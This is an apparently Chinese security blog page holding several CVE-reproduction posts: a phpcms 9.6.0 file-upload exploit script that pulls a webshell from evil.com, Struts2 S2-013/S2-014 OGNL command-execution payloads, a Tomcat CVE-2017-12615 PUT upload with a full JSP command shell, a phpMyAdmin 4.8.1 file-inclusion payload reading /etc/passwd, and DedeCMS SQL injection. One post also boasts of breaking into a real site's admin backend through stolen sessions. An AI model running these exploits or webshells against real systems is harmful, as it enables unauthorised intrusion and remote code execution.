$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;
$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;
$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;
$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;
$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;
$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;
$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;
$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;
$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre>
<p>一个一个查看最后发现:</p>
<pre><code class="php">    function editor($field, $value) {
        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);
        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];
        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);
        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);
        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);
        return $value;
    }</code></pre>
<p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p>
<p>跟进<code>download</code>:</p>
<pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)
    {
        global $image_d;
        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);
        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
        $this-&gt;field = $field;
        $dir = date(&#39;Y/md/&#39;);
        $uploadpath = $upload_url.$dir;
        $uploaddir = $this-&gt;upload_root.$dir;
        $string = new_stripslashes($value);
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
        }
        unset($matches, $string);
        $remotefileurls = array_unique($remotefileurls);
        $oldpath = $newpath = array();
        foreach($remotefileurls as $k=&gt;$file) {
            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;
            $filename = fileext($file);
            $file_name = basename($file);
            $filename = $this-&gt;getname($filename);

            $newfile = $uploaddir.$filename;
            $upload_func = $this-&gt;upload_func;
            if($upload_func($file, $newfile)) {
                $oldpath[] = $k;
                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;
                @chmod($newfile, 0777);
                $fileext = fileext($filename);
                if($watermark){
                    watermark($newfile, $newfile,$this-&gt;siteid);
                }
                $filepath = $dir.$filename;
                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);
                $aid = $this-&gt;add($downloadedfile);
                $this-&gt;downloadedfiles[$aid] = $filepath;
            }
        }
        return str_replace($oldpath, $newpath, $value);
    }    </code></pre>
<p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p>
<p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p>
<p><code>$file</code>是<code>$remotefileurls</code>中的值</p>
<pre><code class="php">        $string = new_stripslashes($value);//反转义
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);
        }</code></pre>
<p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p>
<pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {
        ...
        $pos = strpos($surl,&#39;#&#39;);
        if($pos&gt;0) $surl = substr($surl,0,$pos);
        ...
    }</code></pre>
<p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
<p>我们再看下<code>$newfile</code></p>
<pre><code class="php">$dir = date(&#39;Y/md/&#39;);
$uploaddir = $this-&gt;upload_root.$dir;
$filename = fileext($file);
$filename = $this-&gt;getname($filename);
$newfile = $uploaddir.$filename;</code></pre>
<p><code>$this-&gt;getname</code>:</p>
<pre><code class="php">function getname($fileext){
        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;
    }</code></pre>
<p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
<p>最后payload为:</p>
<pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
post:
info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import re
import requests
import random

def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),
        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)
    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()
    print(rep.text)
    print(result)


exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/">http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr31002tv4v04u2t8x65" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-记一次漏洞挖掘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
  <time class="dt-published" datetime="2020-02-11T05:54:56.708Z" itemprop="datePublished">2020-02-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p>
<p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p>
<p>主要的信息为:</p>
<pre><code>dedecms 5.7sp1 20150618
ZOHO ManageEngine OpManager
adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p>
<p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p>
<p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p>
<p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p>
<p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p>
<p><strong>一些网站的英文站点可能就是我们的突破口</strong></p>
<p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/">http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="cka3ckr3t0051v4v051rwaxa4" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-02-10T15:49:48.012Z" itemprop="datePublished">2020-02-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
<ol>
<li>php magic_quotes_gpc=off</li>
<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
<pre><code class="php">if($action==&#39;admin&#39;)
{
    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);
    exit();
}</code></pre>
<p><code>/plus/guestbook/edit.inc.php</code></p>
<pre><code class="php">if($job==&#39;editok&#39;)
{
    $remsg = trim($remsg);
    if($remsg!=&#39;&#39;)
    {
        //管理员回复不过滤HTML
        if($g_isadmin)
        {
            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg; 
            //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;
        }
        else
        {
            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);
            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;
            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
            $msg = $oldmsg.$remsg;
        }
    } 
    $msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);
    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
    exit();
}</code></pre>
<p>其中:</p>
<pre><code class="php">$msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre>
<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
<pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
    {
        foreach($$_request as $_k =&gt; $_v) 
        {
            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }</code></pre>
<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
<pre><code class="php">function _RunMagicQuotes(&amp;$svar)
{
    if(!get_magic_quotes_gpc())
    {
        ...
    }
    return $svar;
}</code></pre>
<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr1x000bv4v03hcp87y0" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-S2-013_S2-014远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T08:03:56.215Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">S2-013_S2-014远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p>
<pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p>
<pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<p>S2-014</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/08/S2-013_S2-014远程代码执行漏洞/">http://blog.ccreater.top/2020/02/08/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr25000pv4v0czc1fgwp" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T07:28:03.158Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
<p>平台: Windows </p>
<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
<pre><code>PUT /111.jsp::$DATA HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...</code></pre><pre><code class="java">&lt;%
    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;</code></pre>
<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requests
def poc(url):
    filename=&quot;tomcat_check_vuln.txt&quot;
    content=&quot;test&quot;
    try:
        requests.put(url+&quot;/&quot;+filename,data=conetent)
        res=requests.get(url+&quot;/&quot;+filename)
    except :
        return False

    if res.status_code==200:
        return True
    return False
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="cka3ckr2e0016v4v0fkwt27t2" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/phpmyadmin%204.8.1%20rce/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T06:50:47.678Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
<p>登陆账号</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p>
<p>漏洞位置:<code>index.php</code>:57</p>
<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
) {
    include $_REQUEST[&#39;target&#39;];
    exit;
}</code></pre>
<p>非常明显的任意文件包含漏洞</p>
<p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
<p>跟进去</p>
<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }</code></pre>
<p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p>
<pre><code class="php">array (
  0 =&gt; &#39;db_datadict.php&#39;,
....
)</code></pre>
<p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p>
<p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p>
<p>通用的payload:</p>
<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
